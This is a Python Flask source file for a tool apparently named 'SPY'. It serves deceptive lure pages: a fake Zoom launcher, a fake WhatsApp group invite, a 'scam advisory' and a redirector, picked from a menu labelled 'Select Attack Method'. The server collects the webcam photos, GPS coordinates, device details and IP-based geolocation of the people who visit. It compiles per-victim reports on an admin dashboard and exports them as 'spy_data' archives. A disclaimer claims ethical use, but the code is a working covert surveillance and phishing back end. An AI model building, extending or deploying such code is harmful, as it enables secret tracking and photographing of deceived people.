# Copyright (c) 2025 Jutt Cyber Tech. All rights reserved.
# "Original work by Jutt Cyber Tech"
import os
from flask import Flask, render_template, request, session, redirect, url_for, abort, send_from_directory
from datetime import datetime, timedelta
import base64
import logging
import subprocess
import platform
from threading import Lock
import socket
import ipaddress
from docx import Document
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.shared import Inches, RGBColor
import requests
import shutil
import smtplib
from email.mime.text import MIMEText
from dotenv import load_dotenv
import time
import json

# Load environment variables
load_dotenv()

#ANSI color codes for terminal
R = "\033[1;31m"  # Red (for banner)
G = "\033[1;32m"  # Bright Green
C = "\033[1;36m"  # Bright Cyan
W = "\033[1;37m"  # Bright White
B = "\033[1;35m"  # Bright Magenta (Pink)
Y = "\033[1;33m"  # Bright Yellow
M = "\033[1;34m"  # Bright Blue
P = "\033[1;35m"  # Bright Purple
RESET = "\033[0m"  # Reset

# Clear terminal
if platform.system() == "Windows":
    subprocess.call("cls", shell=True)
else:
    subprocess.call("clear", shell=True)

# Enhanced Colorful Banner with Red color
banner = f"""{R}
   _____ _____ __     __
  / ____|  __ \\ \\   / /
 | (___ | |__) | \\ \\_/ / 
  \\___ \\|  __/   \\   /  
  ____) | |        | |   
 |_____/|_|        |_|   
          
{G}----------------------------------------
{C}Creator      : {W} Jutt Cyber Tech
{C}Email        : {W}js434@proton.me
{C}Version      : {W}1.5.0
{G}----------------------------------------
{Y}This tool is designed for ethical purposes,
educational use , and security testing only.
Unauthorized use is strictly prohibited.
{G}----------------------------------------{RESET}
"""
print(banner)

# Suppress Flask logs
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)
app.secret_key = os.urandom(24)  # For session management
print_lock = Lock()

# Admin security variables
failed_attempts = 0
lockout_time = None

# --- MODIFIED: Globals for single-use personalized link ---
is_personalized_session = False
personalized_data = {}
# --------------------------------------------------------

# create necessary folders
folders = ['templates/Attack_files', 'static/css', 'static/js', 'data', 'templates/admin']
for folder in folders:
    os.makedirs(folder, exist_ok=True)

# -------------------------------#
# This is Templates 
TEMPLATES = {
    "Attack_files": { # Flattened structure for easier management
        "1": {"name": "Friendship Forever", "template": "friendship/friendship.html", "personalizable": True},
        "2": {"name": "Zoom Meeting Launcher", "template": "zoom/zoom.html", "personalizable": False},
        "3": {"name": "Business Scam Advisory", "template": "business_scam/business_scam.html", "personalizable": True},
        "4": {"name": "WhatsApp Group Invite", "template": "whatsapp_invite/Whats_app.html", "personalizable": True},
        "5": {"name": "URL Redirector", "template": "redirect/redirect.html", "personalizable": True}
    }
}

# -------------------------------#
# CLI-based template selection for Pic_Location only
def select_template():
    while True:
        print(f"{P}{B}Select Attack Method😈:{RESET}")
        for key, item_data in TEMPLATES["Attack_files"].items():
            display_name = item_data['name']
            print(f"{G}{key}. {C}{display_name}{RESET}")
        
        template_choice = input(f"{Y}> {RESET}").strip()
        selected_option_data = TEMPLATES["Attack_files"].get(template_choice)
        
        if not selected_option_data:
            print(f"{R}Invalid selection.{RESET}")
            continue

        selected_template = selected_option_data['template']
        display_name = selected_option_data['name']

        # --- FIX: Prevent selection of unimplemented templates ---
        # Assuming all listed templates are now implemented.
        # If there are WIP templates, add a 'status' key to TEMPLATES dict entries.
        # ---------------------------------------------------------

        print(f"{G}You selected: {C}{display_name}{RESET}\n")

        # --- NEW: Add personalization for specific templates ---
        global is_personalized_session, personalized_data
        is_personalized_session, personalized_data = False, {} # Reset for each selection
        
        if selected_option_data.get("personalizable"):
            prompt_text = ""
            key_for_data = 'name' # Default key
            print(f"{P}{B}This template can be personalized.{RESET}")
            
            if selected_template == "business_scam.html":
                prompt_text = f"{Y}Enter the Broker/Company name for the CFTC advisory: {RESET}"
            # --- NEW: Handle the URL Redirector template ---
            elif selected_template == "redirect/redirect.html":
                while True:
                    redirect_url = input(f"{Y}Enter the full URL to redirect to (e.g., https://google.com): {RESET}").strip()
                    if redirect_url.startswith('http://') or redirect_url.startswith('https://'):
                        is_personalized_session = True
                        personalized_data = {'redirect_url': redirect_url, 'template': selected_template}
                        print(f"{G}The root URL will now redirect to: {C}{redirect_url}{RESET}")
                        return "Attack_files", selected_template
                    else:
                        print(f"{R}Invalid URL. Please include 'http://' or 'https://'.{RESET}")
            elif selected_template == "Whats_app.html":
                group_name = input(f"{Y}Enter the WhatsApp Group name: {RESET}").strip() # This template name is not unique, need to check path
                group_picture_url = input(f"{Y}Enter the Group Picture URL (leave blank for default): {RESET}").strip()
                is_personalized_session = True
                personalized_data = {
                    'group_name': group_name or "Group Chat",
                    'group_picture_url': group_picture_url,
                    'template': selected_template
                }
                print(f"{G}The root URL will now be personalized for: {C}{group_name or 'Group Chat'}{RESET}")
                return "Attack_files", selected_template
            # --- NEW: Handle templates with the same filename but different paths ---
            elif selected_template == "whatsapp_invite/Whats_app.html":
                group_name = input(f"{Y}Enter the WhatsApp Group name: {RESET}").strip()
                group_picture_url = input(f"{Y}Enter the Group Picture URL (leave blank for default): {RESET}").strip()
                is_personalized_session = True
                personalized_data = {
                    'group_name': group_name or "Group Chat",
                    'group_picture_url': group_picture_url,
                    'template': selected_template
                }
                print(f"{G}The root URL will now be personalized for: {C}{group_name or 'Group Chat'}{RESET}")
                return "Attack_files", selected_template
            elif selected_template == "business_scam/business_scam.html":
                prompt_text = f"{Y}Enter the Broker/Company name for the CFTC advisory: {RESET}"
            else:
                prompt_text = f"{Y}Enter a name to include in the template (this is compulsory): {RESET}"

            while True:
                personal_input = input(prompt_text).strip()
                if personal_input:
                    is_personalized_session = True
                    personalized_data = {key_for_data: personal_input, 'template': selected_template}
                    print(f"{G}The root URL will now be personalized for: {C}{personal_input}{RESET}")
                    break
                print(f"{R}This field cannot be empty. Please enter a name.{RESET}")

        # ---------------------------------------------------
        # The url_suffix is no longer needed
        return "Attack_files", selected_template

# -------------------------------#
# Send email notification function
def send_lockout_email():
    try:
        sender_email = os.getenv("ADMIN_EMAIL")
        receiver_email = os.getenv("ADMIN_EMAIL")
        password = os.getenv("EMAIL_PASSWORD")
        
        if not all([sender_email, receiver_email, password]):
            print(f"{Y}[!] Email credentials not configured{RESET}")
            return False
            
        msg = MIMEText("Someone has attempted to login to your admin panel 4 times unsuccessfully. The admin account has been locked for 10 minutes.")
        msg['Subject'] = 'Admin Account Lockout Notification'
        msg['From'] = sender_email
        msg['To'] = receiver_email
        
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(sender_email, password)
            server.send_message(msg)
        
        print(f"{G}[✓] Lockout email sent{RESET}")
        return True
    except Exception as e:
        print(f"{R}[✗] Failed to send email: {e}{RESET}")
        return False

# -------------------------------#
# Flask route using selected template
category, selected_template = select_template()

@app.route('/')
def index():
    # --- MODIFIED: Check if this is a personalized session ---
    global is_personalized_session, personalized_data
    if is_personalized_session and personalized_data:
        template_name = personalized_data.pop('template') # Remove template from dict to pass others as kwargs
        # Create a copy of the data to pass to the template
        render_data = personalized_data.copy()
        is_personalized_session, personalized_data = False, {} # Reset state immediately
        response = render_template(f"{category}/{template_name}", **render_data)
        return response
    else: # Default behavior for non-personalized templates or if personalization failed
        return render_template(f"{category}/{selected_template}")

# -------------------------------#
# Admin routes
@app.route('/admin')
def admin_login():
    # Check if account is locked
    global lockout_time, failed_attempts
    
    if lockout_time and datetime.now() < lockout_time:
        remaining = (lockout_time - datetime.now()).seconds // 60
        return render_template('admin/login.html', error=f"Account locked. Try again in {remaining} minutes.")
    
    return render_template('admin/login.html')

@app.context_processor
def inject_now():
    """Injects the current year into all templates."""
    return {'now': datetime.utcnow}

@app.template_filter('format_time')
def format_time_filter(dt, format='%B %d, %Y'):
    """A custom Jinja2 filter to format datetime objects."""
    if isinstance(dt, str): return dt # If it's already a string, do nothing
    return dt.strftime(format)

@app.route('/admin/login', methods=['POST'])
def admin_auth():
    global failed_attempts, lockout_time
    
    # Check if account is locked
    if lockout_time and datetime.now() < lockout_time:
        remaining = (lockout_time - datetime.now()).seconds // 60
        return render_template('admin/login.html', error=f"Account locked. Try again in {remaining} minutes.")
    
    username = request.form.get('username')
    password = request.form.get('password')
    
    if username == os.getenv("ADMIN_USERNAME") and password == os.getenv("ADMIN_PASSWORD"):
        # Successful login
        session['admin'] = True
        failed_attempts = 0
        lockout_time = None
        return redirect(url_for('admin_dashboard'))
    else:
        # Failed login
        failed_attempts += 1
        
        if failed_attempts >= 4:
            lockout_time = datetime.now() + timedelta(minutes=10)
            send_lockout_email()
            return render_template('admin/login.html', error="Too many failed attempts. Account locked for 10 minutes.")
        
        return render_template('admin/login.html', error=f"Invalid credentials. {4-failed_attempts} attempts remaining.")

@app.route('/admin/dashboard')
def admin_dashboard():
    if not session.get('admin'):
        return redirect(url_for('admin_login'))
    # The dashboard is now rendered empty and populated by a JavaScript API call.
    return render_template('admin/dashboard.html', admin=True)

@app.route('/api/dashboard_data')
def get_dashboard_data():
    """API endpoint to serve all data needed for the dashboard in one call."""
    if not session.get('admin'):
        abort(403)

    # Get all client data
    clients = []
    data_dir = 'data'
    if os.path.exists(data_dir):
        for client_folder in os.listdir(data_dir):
            client_path = os.path.join(data_dir, client_folder)
            summary_path = os.path.join(client_path, 'summary.json')
            if os.path.isdir(client_path) and os.path.exists(summary_path):
                try:
                    with open(summary_path, 'r') as f:
                        client_info = json.load(f)
                        client_info['id'] = client_folder
                        # Include photo list for map popups
                        client_info['photos'] = sorted([p for p in os.listdir(client_path) if p.endswith('.png')])
                        clients.append(client_info)
                except (json.JSONDecodeError, KeyError):
                    pass # Skip corrupted files

    # Sort clients by date, most recent first
    sorted_clients = sorted(clients, key=lambda c: c.get('date', ''), reverse=True)

    # Calculate stats for the dashboard cards
    unique_countries = {c.get('country') for c in clients if c.get('country') and c.get('country') != 'Unknown'}
    unique_cities = {c.get('city') for c in clients if c.get('city') and c.get('city') != 'Unknown'}
    unique_os_types = {c.get('os') for c in clients if c.get('os') and c.get('os') != 'Unknown'}

    # Count occurrences for analytics section
    country_counts = {}
    city_counts = {}
    os_counts = {}

    for client in clients:
        country = client.get('country', 'Unknown')
        city = client.get('city', 'Unknown')
        os_type = client.get('os', 'Unknown')

        country_counts[country] = country_counts.get(country, 0) + 1
        city_counts[city] = city_counts.get(city, 0) + 1
        os_counts[os_type] = os_counts.get(os_type, 0) + 1

    # Sort by count (descending) and filter out 'Unknown'
    top_countries = sorted([item for item in country_counts.items() if item[0] != 'Unknown'], key=lambda item: item[1], reverse=True)[:5]
    top_cities = sorted([item for item in city_counts.items() if item[0] != 'Unknown'], key=lambda item: item[1], reverse=True)[:5]
    os_breakdown = sorted([item for item in os_counts.items() if item[0] != 'Unknown'], key=lambda item: item[1], reverse=True)

    # Consolidate all data into a single JSON response
    return json.dumps({
        "clients": sorted_clients,
        "stats": {
            "total_clients": len(clients),
            "total_countries": len(unique_countries),
            "total_cities": len(unique_cities),
            "total_os_types": len(unique_os_types)
        },
        "analytics": {
            "top_countries": top_countries,
            "top_cities": top_cities,
            "os_breakdown": os_breakdown
        }
    })

@app.route('/api/server_info')
def get_server_info():
    """API endpoint to serve basic server information."""
    if not session.get('admin'):
        abort(403)
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
    except Exception:
        local_ip = "127.0.0.1"

    server_info = {
        "os": f"{platform.system()} {platform.release()}",
        "python_version": platform.python_version(),
        "local_ip": local_ip,
    }
    return json.dumps(server_info)

def _get_all_clients_summary():
    """Helper function to read all client summary files."""
    clients = []
    data_dir = 'data'
    if os.path.exists(data_dir):
        for client_folder in os.listdir(data_dir):
            summary_path = os.path.join(data_dir, client_folder, 'summary.json')
            if os.path.exists(summary_path):
                try:
                    with open(summary_path, 'r') as f:
                        client_info = json.load(f)
                        client_info['id'] = client_folder
                        clients.append(client_info)
                except (json.JSONDecodeError, KeyError):
                    pass
    return sorted(clients, key=lambda c: c.get('date', ''), reverse=True)

@app.route('/admin/clients')
def admin_clients():
    if not session.get('admin'):
        return redirect(url_for('admin_login'))
    
    clients = _get_all_clients_summary()
    return render_template('admin/clients.html', clients=clients)

@app.route('/admin/analytics')
def admin_analytics():
    if not session.get('admin'):
        return redirect(url_for('admin_login'))

    clients = _get_all_clients_summary()
    
    country_counts = {}
    city_counts = {}
    os_counts = {}
    for client in clients:
        country_counts[client.get('country', 'Unknown')] = country_counts.get(client.get('country', 'Unknown'), 0) + 1
        city_counts[client.get('city', 'Unknown')] = city_counts.get(client.get('city', 'Unknown'), 0) + 1
        os_counts[client.get('os', 'Unknown')] = os_counts.get(client.get('os', 'Unknown'), 0) + 1

    top_countries = sorted([item for item in country_counts.items() if item[0] != 'Unknown'], key=lambda item: item[1], reverse=True)[:5]
    top_cities = sorted([item for item in city_counts.items() if item[0] != 'Unknown'], key=lambda item: item[1], reverse=True)[:5]
    os_breakdown = sorted([item for item in os_counts.items() if item[0] != 'Unknown'], key=lambda item: item[1], reverse=True)

    return render_template('admin/analytics.html', top_countries=top_countries, top_cities=top_cities, os_breakdown=os_breakdown)

@app.route('/admin/client/<client_id>')
def admin_client_details(client_id):
    if not session.get('admin'):
        return redirect(url_for('admin_login'))
    
    client_path = os.path.join('data', client_id)
    if not os.path.exists(client_path) or not os.path.isdir(client_path):
        return "Client not found", 404
    
    # Load summary data for the top card
    summary_data = {}
    summary_path = os.path.join(client_path, 'summary.json')
    if os.path.exists(summary_path):
        with open(summary_path, 'r') as f:
            try:
                summary_data = json.load(f)
            except json.JSONDecodeError: pass
    # Find the docx file
    docx_files = [f for f in os.listdir(client_path) if f.endswith('.docx')]
    if not docx_files:
        return "No data file found for this client", 404
    
    # Read the document
    doc = Document(os.path.join(client_path, docx_files[0]))
    client_data = {"sections": []}
    
    current_section = None
    for paragraph in doc.paragraphs:
        text = paragraph.text
        if paragraph.style.name.startswith('Heading'):
            if current_section:
                client_data["sections"].append(current_section)
            current_section = {"title": text, "content": []}
        elif current_section and text.strip():
            current_section["content"].append(text)
    
    if current_section:
        client_data["sections"].append(current_section)
    
    # Get photos
    photos = [f for f in os.listdir(client_path) if f.endswith('.png')]
    client_data["photos"] = photos
    client_data["id"] = client_id
    client_data["summary"] = summary_data # Pass summary to template
    
    return render_template('admin/client_details.html', client=client_data)

# Route to serve captured images
@app.route('/data/<client_id>/<filename>')
def serve_image(client_id, filename):
    if not session.get('admin'):
        abort(403)  # Forbidden if not admin
    return send_from_directory(os.path.join('data', client_id), filename)

@app.route('/admin/delete/<client_id>', methods=['POST'])
def admin_delete_client(client_id):
    if not session.get('admin'):
        return redirect(url_for('admin_login'))
    
    client_path = os.path.join('data', client_id)
    if os.path.exists(client_path) and os.path.isdir(client_path):
        import shutil
        shutil.rmtree(client_path)
        # Log the deletion
        with open('admin_actions.log', 'a') as f:
            f.write(f"{datetime.now()} - Admin deleted client {client_id}\n")
    
    return redirect(url_for('admin_dashboard'))

@app.route('/admin/logout')
def admin_logout():
    session.pop('admin', None)
    return redirect(url_for('admin_login'))

@app.route('/admin/settings')
def admin_settings():
    if not session.get('admin'):
        return redirect(url_for('admin_login'))
    return render_template('admin/settings.html')

@app.route('/admin/export_data')
def export_data():
    if not session.get('admin'):
        abort(403)
    
    data_dir = 'data'
    if not os.path.exists(data_dir) or not os.listdir(data_dir):
        return redirect(url_for('admin_settings')) # Redirect if no data

    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    archive_name = f'spy_data_{timestamp}'
    # Create archive in a temporary location if needed, here we use the project root
    archive_path = shutil.make_archive(archive_name, 'zip', data_dir)
    
    return send_from_directory(os.getcwd(), f"{archive_name}.zip", as_attachment=True)

@app.route('/admin/delete_all_data', methods=['POST'])
def delete_all_data():
    if not session.get('admin'):
        abort(403)
    shutil.rmtree('data', ignore_errors=True)
    os.makedirs('data', exist_ok=True) # Recreate the empty directory
    return redirect(url_for('admin_settings'))

# Prevent access to .env file
@app.route('/.env')
def block_env():
    abort(404)

# -------------------------------#
# Helpers for NETWORK ONLY
# -------------------------------
def get_client_ip():
    xff = request.headers.get("X-Forwarded-For", "")
    if xff:
        first = xff.split(",")[0].strip()
        if first:
            return first
    return request.remote_addr or ""

def split_ip_versions(ip_str):
    ip4, ip6 = "", ""
    try:
        ip_obj = ipaddress.ip_address(ip_str)
        if ip_obj.version == 4:
            ip4 = ip_str
        elif ip_obj.version == 6:
            ip6 = ip_str
    except Exception:
        pass
    return ip4, ip6

def fetch_geo(ip_str):
    token = os.getenv("IPINFO_TOKEN")
    if not token:
        print(f"{Y}[!] IPINFO_TOKEN not found in .env file. Geolocation will be limited.{RESET}")
        return {}

    # Use the full API endpoint for detailed geolocation
    url = f"https://ipinfo.io/{ip_str}"
    try:
        r = requests.get(url, params={"token": token}, timeout=8)
        r.raise_for_status()  # Raise an exception for bad status codes (4xx or 5xx)
        j = r.json()

        # Parse the full API response
        lat, lon = None, None
        if 'loc' in j and ',' in j['loc']:
            try:
                lat, lon = map(float, j['loc'].split(','))
            except ValueError:
                pass # Keep lat, lon as None if conversion fails

        return {
            "continent": j.get("continent", "Unknown"),
            "country":   j.get("country", "Unknown"),
            "region":    j.get("region", "Unknown"),
            "city":      j.get("city", "Unknown"),
            "org":       j.get("org", "Unknown"),
            "isp":       j.get("org", "Unknown"), # 'org' often contains ISP info
            "ip_latitude": lat,
            "ip_longitude": lon,
        }
    except requests.exceptions.RequestException as e:
        print(f"{R}[!] Failed to fetch geo data from ipinfo.io: {e}{RESET}")
        return {}

# -------------------------------
# Routes
# -------------------------------
@app.route("/save_photo", methods=["POST"])
def save_photo():
    req_data = request.get_json()
    if not req_data or "image" not in req_data or "clientId" not in req_data:
        abort(400)

    client_id = req_data["clientId"]
    image_data = req_data["image"]
    _, encoded = image_data.split(",", 1)
    binary = base64.b64decode(encoded)

    client_folder = os.path.join("data", client_id)
    os.makedirs(client_folder, exist_ok=True)

    filename = os.path.join(client_folder, f"photo_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
    with open(filename, "wb") as f:
        f.write(binary)
    
    print(f"{G}[+] Photo captured for client {C}{client_id}{RESET}")
    return ""

@app.route("/save_location", methods=["POST"])
def save_location():
    req_data = request.get_json()
    if not req_data or "clientId" not in req_data:
        abort(400)
    
    client_id = req_data["clientId"]
    lat = req_data.get("latitude")
    lon = req_data.get("longitude")

    # Store location data in a temporary file associated with the client ID
    client_folder = os.path.join("data", client_id)
    os.makedirs(client_folder, exist_ok=True)
    with open(os.path.join(client_folder, 'location.tmp'), 'w') as f:
        json.dump({'latitude': lat, 'longitude': lon}, f)

    return ""

@app.route("/save_client_info", methods=["POST"])
def save_client_info():
    info = request.json if request.is_json else {}
    client_id = info.pop("clientId", f"unknown_{datetime.now().strftime('%Y%m%d%H%M%S')}")

    client_ip = get_client_ip()
    ip4, ip6 = split_ip_versions(client_ip)

    # Prioritize IPv4 for geolocation as it's often more accurate.
    # Fallback to IPv6 if IPv4 is not available.
    geo_ip_to_use = ip4 or ip6
    geo = fetch_geo(geo_ip_to_use) if geo_ip_to_use else {}
    continent = geo.get("continent", "Unknown")
    country   = geo.get("country", "Unknown")
    region    = geo.get("region", "Unknown")
    city      = geo.get("city", "Unknown")
    org       = geo.get("org", "Unknown")
    isp       = geo.get("isp", "Unknown")

    client_folder = os.path.join("data", client_id)
    os.makedirs(client_folder, exist_ok=True)

    with print_lock:
        print(f"\n{B}╔══════════════════════════════════╗{RESET}")
        print(f"{B}║ {Y}New Client: {C}{client_id[:18]:<18}{B} ║{RESET}")
        print(f"{B}╚══════════════════════════════════╝{RESET}")

    # Word document
    doc = Document()
    title = doc.add_heading(f"Client ID: {client_id} - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", level=0)
    title.alignment = WD_ALIGN_PARAGRAPH.CENTER

    # Device Information heading with color & bold
    heading = doc.add_heading("Device Information", level=1)
    heading.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = heading.runs[0]
    run.font.color.rgb = RGBColor(46, 134, 193)  # Blue
    run.font.bold = True

    for key in ["platform", "osVersion", "cpuCores", "ram", "gpu", "screenWidth", "screenHeight", "battery", "userAgent"]:
        doc.add_paragraph(f"{key} : {info.get(key, 'Unknown')}", style='List Bullet')

    # Network Information heading with color & bold
    heading = doc.add_heading("Network Information", level=1)
    heading.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = heading.runs[0]
    run.font.color.rgb = RGBColor(40, 180, 99)  # Green
    run.font.bold = True

    doc.add_paragraph(f"IPv4 : {ip4 or 'Unknown'}", style='List Bullet')
    doc.add_paragraph(f"IPv6 : {ip6 or 'Unknown'}", style='List Bullet')
    doc.add_paragraph(f"Continent : {continent}", style='List Bullet')
    doc.add_paragraph(f"Country : {country}", style='List Bullet')
    doc.add_paragraph(f"Region : {region}", style='List Bullet')
    doc.add_paragraph(f"City : {city}", style='List Bullet')
    doc.add_paragraph(f"Org : {org}", style='List Bullet')
    doc.add_paragraph(f"ISP : {isp}", style='List Bullet')

    # Read location from temp file
    last_location_url = None
    location_file = os.path.join(client_folder, 'location.tmp')
    if os.path.exists(location_file):
        doc.add_heading("Location", level=1)
        with open(location_file, 'r') as f:
            loc_data = json.load(f)
            lat, lon = loc_data.get('latitude'), loc_data.get('longitude')
            if lat and lon:
                last_location_url = f"https://www.google.com/maps?q={lat},{lon}"
                doc.add_paragraph(f"Google Maps URL : {last_location_url}", style='List Bullet')

    photos = sorted([f for f in os.listdir(client_folder) if f.endswith(".png")])
    if photos:
        # Captured Photos heading colored
        heading = doc.add_heading("Captured Photos", level=1)
        heading.alignment = WD_ALIGN_PARAGRAPH.LEFT
        run = heading.runs[0]
        run.font.color.rgb = RGBColor(155, 89, 182)  # Purple
        run.font.bold = True
        for photo in photos:
            doc.add_paragraph(photo)
            doc.add_picture(os.path.join(client_folder, photo), width=Inches(4))

    # Ethical notice
    doc.add_heading("Developer & Ethical Notice", level=1)
    doc.add_paragraph("Developed by: JS", style='List Bullet')
    doc.add_paragraph("Creator: 😈😈😈", style='List Bullet')
    doc.add_paragraph("This tool is designed for ethical purposes, educational use, and security testing only. Unauthorized use is strictly prohibited.", style='List Bullet')

    doc_path = os.path.join(client_folder, f"info_{datetime.now().strftime('%Y%m%d_%H%M%S')}.docx")
    doc.save(doc_path)

    # --- NEW: Reverse geocode GPS coordinates for better accuracy ---
    gps_city = None
    gps_country = None
    gps_lat, gps_lon = None, None
    if os.path.exists(location_file):
        with open(location_file, 'r') as f:
            loc_data = json.load(f)
            gps_lat = loc_data.get('latitude')
            gps_lon = loc_data.get('longitude')
        os.remove(location_file) # Clean up temp file
        if gps_lat and gps_lon:
            try:
                headers = {'User-Agent': 'SpyApp/1.0'} # Nominatim API requires a User-Agent
                rev_geo_url = f"https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat={gps_lat}&lon={gps_lon}"
                rev_geo_res = requests.get(rev_geo_url, headers=headers, timeout=8)
                rev_geo_data = rev_geo_res.json()
                address = rev_geo_data.get('address', {})
                # Prioritize city, then town, then village, then fallback to IP-based city
                gps_city = address.get('city') or address.get('town') or address.get('village') or city
                gps_country = address.get('country') or country
            except Exception as e:
                print(f"{R}[!] Reverse geocoding failed: {e}{RESET}")
    # -------------------------------------------------------------

    # --- NEW: Save a summary JSON for faster dashboard loading ---
    summary_data = {
        "date": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        "os": info.get('osVersion', 'Unknown'),
        "country": gps_country or country, # Prioritize GPS-based country
        "city": gps_city or city,          # Prioritize GPS-based city
        "ip": ip4 or ip6 or 'Unknown',
        "isp": isp,
        "gps_latitude": gps_lat,
        "gps_longitude": gps_lon,
        "ip_latitude": geo.get('ip_latitude'), # Get approximate lat from IP
        "ip_longitude": geo.get('ip_longitude') # Get approximate lon from IP
    }
    summary_path = os.path.join(client_folder, "summary.json")
    with open(summary_path, 'w') as f:
        json.dump(summary_data, f, indent=4)
    # -------------------------------------------------------------

    with print_lock:
        # Terminal bold headings with better formatting
        print(f"\n{P}╔══════════════════════════════════╗{RESET}")
        print(f"{P}║ {Y}Device Information {P}               ║{RESET}")
        print(f"{P}╚══════════════════════════════════╝{RESET}")
        print(f"{G}├─ {C}OS         : {W}{info.get('osVersion','Unknown')}{RESET}")
        print(f"{G}├─ {C}Platform   : {W}{info.get('platform','Unknown')}{RESET}")
        print(f"{G}├─ {C}CPU Cores  : {W}{info.get('cpuCores','Unknown')}{RESET}")
        print(f"{G}├─ {C}RAM        : {W}{info.get('ram','Unknown')}{RESET}")
        print(f"{G}├─ {C}GPU        : {W}{info.get('gpu','Unknown')}{RESET}")
        print(f"{G}├─ {C}Resolution : {W}{info.get('screenWidth','Unknown')}x{info.get('screenHeight','Unknown')}{RESET}")
        print(f"{G}├─ {C}Battery    : {W}{info.get('battery','Unknown')}%{RESET}")
        print(f"{G}└─ {C}Browser    : {W}{info.get('userAgent','Unknown')}{RESET}")

        print(f"\n{P}╔══════════════════════════════════╗{RESET}")
        print(f"{P}║ {Y}Network Details {P}                  ║{RESET}")
        print(f"{P}╚══════════════════════════════════╝{RESET}")
        print(f"{G}├─ {C}Public IP  : {W}{ip4 or ip6 or 'Unknown'}{RESET}")
        print(f"{G}├─ {C}Continent  : {W}{continent}{RESET}")
        print(f"{G}├─ {C}Country    : {W}{country}{RESET}")
        print(f"{G}├─ {C}Region     : {W}{region}{RESET}")
        print(f"{G}├─ {C}City       : {W}{city}{RESET}")
        print(f"{G}├─ {C}Org        : {W}{org}{RESET}")
        print(f"{G}└─ {C}ISP        : {W}{isp}{RESET}")
        if last_location_url:
            print(f"{G}└─ {C}Google Maps URL : {W}{last_location_url}{RESET}")

        # Only show a simple message if photos were captured
        photos = [f for f in os.listdir(client_folder) if f.startswith('photo_') and f.endswith('.png')]
        if photos:
            print(f"{G}[+] {len(photos)} Photos Captured{RESET}")

    return ""

# === LOCALHOST RUN ===
if __name__ == "__main__":
    # --- MODIFICATION: Make server accessible on the local network ---
    host_ip = "0.0.0.0"  # Listen on all available network interfaces
    port = 5050

    # Find the local network IP to display a usable link
    local_ip = "127.0.0.1"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80)) # Connect to a public DNS to find the preferred outbound IP
        local_ip = s.getsockname()[0]
        s.close()
    except Exception:
        pass # Fallback to 127.0.0.1 if unable to determine

    print(f"\n{G}[+] Server is running! Access it from your network:{W}")
    print(f"    {C}>>> http://{local_ip}:{port}{W}\n")
    app.run(host=host_ip, port=port, debug=False, load_dotenv=False)